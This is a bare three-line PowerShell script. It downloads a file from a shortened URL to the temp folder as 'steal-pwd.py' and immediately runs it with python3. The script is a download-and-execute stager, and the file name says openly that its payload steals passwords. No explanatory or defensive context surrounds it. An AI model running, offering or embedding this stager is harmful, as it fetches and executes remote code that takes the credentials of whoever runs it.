$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://rebrand.ly/gdjbofx", "$env:temp\steal-pwd.py")
python3 "$env:temp\steal-pwd.py"
